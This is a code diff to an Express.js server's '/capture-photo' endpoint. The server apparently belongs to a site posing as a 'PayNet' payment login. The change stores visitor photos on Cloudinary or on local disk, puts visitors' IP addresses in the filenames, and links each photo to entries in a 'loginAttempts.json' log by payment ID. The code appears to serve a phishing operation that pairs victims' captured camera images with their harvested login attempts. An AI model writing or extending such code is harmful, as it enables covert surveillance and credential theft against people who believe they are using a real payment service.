@@ -575,10 +575,9 @@ app.get("/forgot-password", (req, res) => {
 });
 
 
-// Endpoint to receive and save captured photos
 app.post("/capture-photo", async (req, res) => {
   try {
-    const { photo } = req.body;
+    const { photo, paymentId } = req.body;
 
     if (!photo) {
       return res.status(400).json({ success: false, message: "No photo data" });
@@ -588,31 +587,46 @@ app.post("/capture-photo", async (req, res) => {
     const timestamp = new Date().toISOString().replace(/:/g, "-");
     const publicId = `paynet_${timestamp}_${ip.replace(/[.:]/g, "-")}`;
 
+    let photoUrl = null;
+    let filename = null;
+
     // Upload to Cloudinary if available
     if (process.env.CLOUDINARY_URL || process.env.CLOUDINARY_API_KEY) {
       const uploadResponse = await cloudinary.uploader.upload(photo, {
         public_id: publicId,
         folder: "paynet_captures"
       });
+      photoUrl = uploadResponse.secure_url;
+      filename = uploadResponse.public_id;
+    } else {
+      // Fallback to local storage (for development)
+      const capturesDir = path.join(__dirname, "captures");
+      if (!fs.existsSync(capturesDir)) fs.mkdirSync(capturesDir);
 
-      return res.json({
-        success: true,
-        filename: uploadResponse.public_id,
-        url: uploadResponse.secure_url
-      });
+      filename = `${publicId}.jpg`;
+      const filepath = path.join(capturesDir, filename);
+      const base64Data = photo.replace(/^data:image\/\w+;base64,/, "");
+      const buffer = Buffer.from(base64Data, "base64");
+      fs.writeFileSync(filepath, buffer);
     }
 
-    // Fallback to local storage (for development)
-    const capturesDir = path.join(__dirname, "captures");
-    if (!fs.existsSync(capturesDir)) fs.mkdirSync(capturesDir);
+    // Link this photo to the latest attempt for this paymentId
+    if (paymentId && paymentId !== 'UNKNOWN') {
+      const logFile = path.join(__dirname, "loginAttempts.json");
+      let attempts = safeReadJSON(logFile, []);
 
-    const filename = `${publicId}.jpg`;
-    const filepath = path.join(capturesDir, filename);
-    const base64Data = photo.replace(/^data:image\/\w+;base64,/, "");
-    const buffer = Buffer.from(base64Data, "base64");
-    fs.writeFileSync(filepath, buffer);
+      // Find the most recent attempt for this paymentId
+      const attemptIndex = attempts.map(a => a.verificationId).lastIndexOf(paymentId);
 
-    res.json({ success: true, filename });
+      if (attemptIndex !== -1) {
+        attempts[attemptIndex].photoData = "[CAPTURED]";
+        attempts[attemptIndex].photoFilename = filename;
+        if (photoUrl) attempts[attemptIndex].cloudinaryUrl = photoUrl;
+        safeWriteJSON(logFile, attempts);
+      }
+    }
+
+    res.json({ success: true, filename, url: photoUrl });
   } catch (error) {
     console.error("Capture error:", error);
     res.status(500).json({ success: false, error: error.message });
